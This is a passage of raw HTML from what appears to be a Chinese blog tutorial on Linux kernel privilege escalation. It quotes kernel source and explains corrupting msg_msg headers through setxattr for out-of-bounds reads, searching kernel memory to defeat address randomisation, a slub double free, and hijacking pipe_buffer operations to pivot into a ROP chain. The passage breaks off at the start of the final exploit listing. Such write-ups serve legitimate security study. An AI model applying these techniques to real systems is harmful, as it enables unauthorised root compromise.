class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msq_queue structure for each present queue on the system */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line"><span class="type">time64_t</span> q_stime;<span class="comment">/* last msgsnd time */</span></span><br><span class="line"><span class="type">time64_t</span> q_rtime;<span class="comment">/* last msgrcv time */</span></span><br><span class="line"><span class="type">time64_t</span> q_ctime;<span class="comment">/* last change time */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> q_cbytes;<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> q_qnum;<span class="comment">/* number of messages in queue */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> q_qbytes;<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span><span class="comment">/* pid of last msgsnd */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span><span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>而当我们调用 msgsnd 系统调用在指定消息队列上发送一条指定大小的 message 时，在内核空间中会创建这样一个结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line"><span class="type">long</span> m_type;</span><br><span class="line"><span class="type">size_t</span> m_ts;<span class="comment">/* message text size */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">void</span> *security;</span><br><span class="line"><span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在内核当中这两个结构体形成一个如下结构的循环双向链表：</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>若是消息队列中只有一个消息则是这样：</p><p><img src="https://s2.loli.net/2022/02/24/sD9xtpaHrQ2uneZ.png" alt="image.png"></p><p>接下来我们来深入 msg_msg 的内部结构，阅读 msgsnd 源码可知，当我们在消息队列上发送一个 message 时，其首先会调用 <code>load_msg</code> 将该 message 拷贝到内核中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">do_msgsnd</span><span class="params">(<span class="type">int</span> msqid, <span class="type">long</span> mtype, <span class="type">void</span> __user *mtext,</span></span><br><span class="line"><span class="params"><span class="type">size_t</span> msgsz, <span class="type">int</span> msgflg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">DEFINE_WAKE_Q(wake_q);</span><br><span class="line"></span><br><span class="line">ns = current-&gt;nsproxy-&gt;ipc_ns;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (msgsz &gt; ns-&gt;msg_ctlmax || (<span class="type">long</span>) msgsz &lt; <span class="number">0</span> || msqid &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (mtype &lt; <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">msg = load_msg(mtext, msgsz);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>而 <code>load_msg()</code> 最终会调用到 <code>alloc_msg()</code> 分配所需的空间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> msg_msg *<span class="title function_">load_msg</span><span class="params">(<span class="type">const</span> <span class="type">void</span> __user *src, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"><span class="type">int</span> err = -EFAULT;</span><br><span class="line"><span class="type">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">msg = alloc_msg(len);</span><br></pre></td></tr></table></figure><p>阅读 <code>alloc_msg()</code> 源码可以发现，其以 msg_msg 结构体为核心生成如下结构：</p><ul><li>对于大小在【一个页面再减掉作为 header 的 msg_msg 的 size】范围内的数据而言，内核仅会分配一个 size + header size 大小的 object（通过 kmalloc），其前 0x30 大小的部分存放 msg_msg 这一 header，剩余部分用以存放用户数据</li><li>对于大小超出【一个页面再减掉作为 header 的 msg_msg 的 size】范围的数据而言，其会额外生成 <code>msg_msgseg</code> 结构体来存放用户数据，通过 kmalloc 分配，大小为剩余未拷贝的用户数据大小加上 next 指针；该结构体与 msg_msg 的 next 成员形成一个<strong>单向链表</strong>，其前 8 字节存放指向下一个 msg_msgseg 的指针，若无则为 NULL</li></ul><p><img src="https://s2.loli.net/2022/02/24/5IcVxRaFQtg3HCW.png" alt="image.png"></p><p>我们不难想到的是，我们可以分配一个大小为 1024 的 msg_msg 结构体作为 victim，利用 setxattr 系统调用修改其 header 中的 <code>m_ts</code> 成员，<strong>从而实现堆上的越界数据读取</strong>，同时还能通过修改 msg_msg-&gt;next <strong>实现任意地址读</strong></p><p>但是这样有一个问题，当我们调用 msgrcv 接受消息时，其会调用 <code>list_del()</code> 将对应的 msg_msg 结构体从双向链表中 unlink，<strong>此时我们并不知道内核空间中的任何地址，因此内核会在 unlink 时 panic 掉</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">do_msgrcv</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> __user *buf, <span class="type">size_t</span> bufsz, <span class="type">long</span> msgtyp, <span class="type">int</span> msgflg,</span></span><br><span class="line"><span class="params">       <span class="type">long</span> (*msg_handler)(<span class="type">void</span> __user *, <span class="keyword">struct</span> msg_msg *, <span class="type">size_t</span>))</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    list_del(&amp;msg-&gt;m_list);</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">goto</span> out_unlock0;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">out_unlock0:</span><br><span class="line">ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">wake_up_q(&amp;wake_q);</span><br><span class="line">out_unlock1:</span><br><span class="line">rcu_read_unlock();</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(msg)) &#123;</span><br><span class="line">free_copy(copy);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bufsz = msg_handler(buf, msg, bufsz);</span><br><span class="line">free_msg(msg);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> bufsz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们需要想一个方法既能读出 msg_msg 中数据又不会让其被非法 unlink 掉，阅读源码我们会发现，当我们在调用 msgrcv 时若设置了 <code>MSG_COPY</code> 标志位，则<strong>内核会将 message 拷贝一份后再拷贝到用户空间，原双向链表中的 message 并不会被 unlink</strong>，从而我们便可以多次重复地读取同一个 <code>msg_msg</code> 结构体中数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line"><span class="keyword">if</span> ((msgflg &amp; MSG_EXCEPT) || !(msgflg &amp; IPC_NOWAIT))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">copy = prepare_copy(buf, <span class="type">min_t</span>(<span class="type">size_t</span>, bufsz, ns-&gt;msg_ctlmax));</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(copy))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(copy);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment"> * not update queue parameters.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">msg = copy_msg(msg, copy);</span><br><span class="line"><span class="keyword">goto</span> out_unlock0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>接下来我们考虑越界读取的详细过程，我们首先可以利用 setxattr 修改 msg_msg 的 <code>next</code> 指针为 NULL、将其 <code>m_ts</code> 改为 <code>0x1000 - 0x30</code>（在 next 指针为 NULL 的情况下，一个 msg_msg 结构体最大占用一张内存页的大小），从而越界读出内核堆上数据</p><p>接下来我们思考如何进行“合法”的搜索，我们先来看 <code>copy_msg</code> 的逻辑，其拷贝时判断待数据长度的逻辑<strong>主要是看 next 指针</strong>，因此若我们的 next 指针为一个非法地址，则会在解引用时导致 kernel panic</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> msg_msg *<span class="title function_">copy_msg</span><span class="params">(<span class="keyword">struct</span> msg_msg *src, <span class="keyword">struct</span> msg_msg *dst)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">dst_pseg</span>, *<span class="title">src_pseg</span>;</span></span><br><span class="line"><span class="type">size_t</span> len = src-&gt;m_ts;</span><br><span class="line"><span class="type">size_t</span> alen;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (src-&gt;m_ts &gt; dst-&gt;m_ts)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line">alen = min(len, DATALEN_MSG);</span><br><span class="line"><span class="built_in">memcpy</span>(dst + <span class="number">1</span>, src + <span class="number">1</span>, alen);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (dst_pseg = dst-&gt;next, src_pseg = src-&gt;next;</span><br><span class="line">     src_pseg != <span class="literal">NULL</span>;</span><br><span class="line">     dst_pseg = dst_pseg-&gt;next, src_pseg = src_pseg-&gt;next) &#123;</span><br><span class="line"></span><br><span class="line">len -= alen;</span><br><span class="line">alen = min(len, DATALEN_SEG);</span><br><span class="line"><span class="built_in">memcpy</span>(dst_pseg + <span class="number">1</span>, src_pseg + <span class="number">1</span>, alen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dst-&gt;m_type = src-&gt;m_type;</span><br><span class="line">dst-&gt;m_ts = src-&gt;m_ts;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们需要确保<strong>获得一个合法的堆上地址进行搜索的同时</strong>确保我们所构造的<strong>next 链上皆为合法地址，并以 NULL 结尾</strong>，如何找到这样一个地址？</p><p>我们都知道，slub 会向 buddy system 申请一张或多张连续内存页，将其分割为指定大小的 object 之后再返还给 kmalloc 的 caller，对于大小为 1024 的 object，其每次申请的连续内存页为四张，分为 16 个 object</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">cat</span> /proc/sla</span> </span><br><span class="line">Password: </span><br><span class="line">slabinfo - version: 2.1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">name            &lt;active_objs&gt; &lt;num_objs&gt; &lt;objsize&gt; &lt;objperslab&gt; &lt;pagesperslab&gt; : tunables &lt;<span class="built_in">limit</span>&gt; &lt;batchcount&gt; &lt;sharedfactor&gt; : slabdata &lt;active_slabs&gt; &lt;num_slabs&gt; &lt;sharedavail&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">...</span></span><br><span class="line">kmalloc-1k          3341   3584   1024   16    4 : tunables    0    0    0 : slabdata    224    224      0</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">...</span></span><br></pre></td></tr></table></figure><p>我们不难想到的是，若是我们<strong>分配多个大小同为 1024 的 msg_msg 结构体，则其很容易落在地址连续的 4 张内存页上</strong>，此时若是我们从其中一个 msg_msg 结构体向后进行越界读，<strong>则很容易读取到其他的 msg_msg 结构体的数据</strong>，其 m_list 成员可以帮助我们泄露出一个堆上地址</p><p>那么这个堆上地址指向哪呢？让我们将目光重新放回 <code>msg_queue</code> 与 <code>msg_msg</code> 结构体之间的关系，当一个消息上只有一个 message 时，我们不难看出 msg_msg 的 prev 与 next 指针都指向 msg_queue 的 <code>q_messages</code> 域，对应地， msg_queue-&gt;q_message 的 prev 与 next 也同样指向 msg_msg 的 <code>m_list</code> 域</p><p><img src="https://s2.loli.net/2022/02/24/sD9xtpaHrQ2uneZ.png" alt="image.png"></p><p>此时我们不难想到，<strong>我们可以将 msg_msg 的 next 指针指回 msg_queue，从而读出上面的指向 msg_msg 的指针，将未知的地址变为已知的地址</strong>，之后我们在搜索时便可以选择从该地址开始搜索，这样我们就能知道每次搜索时获得的每一条数据的地址，<strong>从而在每次搜索时能够挑选已知数据为 NULL 的区域作为 next-&gt;next 以避免 kernel panic</strong>，以此获得连续的搜索内存的能力</p><p>但是这有一个小要求，我们在泄露 msg_msg 地址时应当选取 msg_queue-&gt;q_message 往前的一块为 NULL 的区域作为 msg_msg-&gt;next，不过令笔者欣喜的是，<code>msg_queue-&gt;q_lrpid</code> 在未使用 msgrcv 接收消息时<strong>为 NULL</strong>，该成员在 q_message 成员向前的 8 字节处，因此我们可以将 next 指针指向这个位置</p><p><img src="https://s2.loli.net/2022/02/25/5fOESRbu6Zan7mU.png" alt="image.png"></p><p>泄露出 msg_msg 的地址之后就可以开始愉快的内存搜索了，至于在泄露出内核代码段上指针后如何计算出内核代码段基址，笔者这里的做法比较笨：将经常出现的内核指针做成一个字典，之后直接 query 即可，若字典未命中则继续搜索</p><blockquote><p>可能有的人会想到一个更为快捷的办法：因为我们已经获得了内核的“堆上地址”，所以我们可以去猜测“堆的基址”（<code>page_offset_base</code>），在 <code>page_offset_base + 0x9d000</code> 处<strong>固定存放着</strong> <code>secondary_startup_64</code> 函数的地址，而这个地址前面刚好有一片为 0 的区域方便我们的 next 指针进行指向</p><p>但这个做法有一定的风险：若是我们猜错了则很容易导致 kernel panic，且经笔者尝试会在我们的下一步中<strong>导致 kernel panic</strong>（也可能是笔者的构造存在缺陷），所以笔者还是更推荐大家只用内存搜索的办法</p></blockquote><h3 id="Step-III-构造-A-gt-B-gt-A-式-freelist-劫持新的结构体"><a href="#Step-III-构造-A-gt-B-gt-A-式-freelist-劫持新的结构体" class="headerlink" title="Step.III 构造 A-&gt;B-&gt;A 式 freelist 劫持新的结构体"></a>Step.III 构造 A-&gt;B-&gt;A 式 freelist 劫持新的结构体</h3><p>现在地址泄露的工作已经完成了，接下来我们来考虑如何进行提权，比较朴素的提权方法有两种：修改进程 cred 结构体或是劫持内核执行流</p><p>对于前一种方法我们需要获得内核中的任意地址写，可能此时有的同学已经想到了利用 userfaultfd + msg_msg 这一任意写方法，而现在我们有着内存搜索技术，自然可以直接使用 prctl 设置 task_struct 的 comm 成员后进行暴力搜索，但首先<strong>我们并不知道 PCB 地址在当前已知堆地址的前方还是后方</strong>，无论搜索前向越界还是后向越界到了非法地址都会引起 kernel panic，且自内核版本 5.11 起 <strong>userfaultfd 系统调用被限制为 root 权限才能使用</strong>，因此笔者选择控制一些有着函数指针的结构体从而劫持内核执行流</p><p>那么我们要将该 object 分配到别的地方，还要能对其进行修改，那么我们<strong>必须要先将该 object 放回 slub 中</strong>，因为此时该 object 虽为 free 状态，但当我们将其分配到别的结构体上后<strong>我们便无法再控制其内容</strong>，因为此时原 msg_msg 结构体的数据会被新结构体覆盖，<strong>无法正常被释放</strong>（过不了 msgrcv 中的 unlink）</p><p>因此接下来我们的工作便是先维修 msg_msg 中的双向链表，让其指向内核堆上一个合法的地址，同时让 next 指针为 NULL 即可，这里我们可以直接选择使用 setxattr 完成修复，可能有的同学这里会有疑问：m_list 成员位于 msg_msg 的前 16 字节，在 setxattr 将其放回 slub 时<strong>难道不会又将其修改为一个 slub 中的指针从而破坏双向链表么</strong>？开启了 hardened freelist 保护时 free object 的 next 指针字面量并非一个合法地址。这里我们就要说到 slub 的一个特性了：</p><ul><li>不同于 glibc 中空闲堆块固定使用前 8 字节的组织方式，在 slub 中空闲的 object 在其对应的 kmem_cache-&gt;offset 处存放下一个 free object 的指针（开启了 hardened freelist 保护时该值为当前 object 与 下一个 object 地址再与一个 random 值总共三个值进行异或的结果）</li></ul><p>经笔者多次测试，对于这种较大的 object 而言，其 offset 通常会大于 msg_msg header 的大小，因此我们可以进行完美修复</p><p>修复完成之后我们考虑如何进行 double free，因为 slub 的释放函数并没有太多的保护，如同 glibc 中的 fastbin 一般只会检查 freelist 上的第一个 object，因此我们只需要像做用户态 pwn 题那样构造 A-&gt;B-&gt;A 的释放链便能将 UAF 再应用到其他内核结构体上</p><h3 id="Step-IV-pipe-buffer-劫持-RIP"><a href="#Step-IV-pipe-buffer-劫持-RIP" class="headerlink" title="Step.IV pipe_buffer 劫持 RIP"></a>Step.IV pipe_buffer 劫持 RIP</h3><p>最后我们来挑选一个内核结构体来劫持 RIP，这里笔者选择了 <code>pipe_buffer</code> 这一结构体，当我们创建一个管道时，在内核中会生成数个连续的该结构体，申请的内存总大小刚好会让内核从 kmalloc-1k 中取出一个 object</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *@page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *@offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *@len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *@flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *@private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>而当我们关闭了管道的两端时，会触发 <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> 这一指针，因此我们只需要劫持其函数表即可，劫持的位置也很清晰：前面我们在搜索内存时获取到了其中一个 msg_msg 的地址，只需要减去其与被用于 UAF 的 object 的地址之间的偏移即可，这个偏移值在搜索过程中是可以计算出来的</p><p>之后我们将函数表劫持到 pipe_buffer 所处 object 上，在该 object 上布置好 ROP 链，再选一条合适的用于栈迁移的 gadget 即可</p><p>经笔者实测，此时的 rsi 寄存器指向 pipe_buffer，因此笔者选择了一条 <code>push rsi ; pop rsp ; pop 4 vals ; ret</code> 的 gadget 完成栈迁移</p><p><img src="https://s2.loli.net/2022/02/25/daklBHtIYCs3K6q.png" alt="image.png"></p><h3 id="FINAL-EXPLOIT"><a href="#FINAL-EXPLOIT" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>最终的 exp 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span 